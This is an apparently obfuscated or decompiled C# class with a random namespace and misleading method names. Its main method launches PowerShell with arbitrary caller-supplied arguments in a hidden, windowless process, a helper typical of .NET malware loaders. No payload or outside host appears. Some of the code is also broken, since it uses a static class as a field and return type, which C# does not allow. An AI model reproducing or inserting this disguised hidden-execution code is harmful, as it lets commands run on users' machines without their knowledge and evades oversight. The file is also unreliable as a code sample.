using System.Diagnostics;

namespace Zbawmbnkfyxecxwmbji.Objects;

public static class TemplateDispatcherObject
{
	internal static TemplateDispatcherObject RegisterThread;

	public static Process SortMock(string info)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		CompareThread(processStartInfo, "powershell");
		processStartInfo.Arguments = info;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		return Process.Start(processStartInfo);
	}

	internal static void CompareThread(object object_0, object object_1)
	{
		((ProcessStartInfo)object_0).FileName = (string)object_1;
	}

	internal static bool SetThread()
	{
		return RegisterThread == null;
	}

	internal static TemplateDispatcherObject InsertThread()
	{
		return RegisterThread;
	}
}
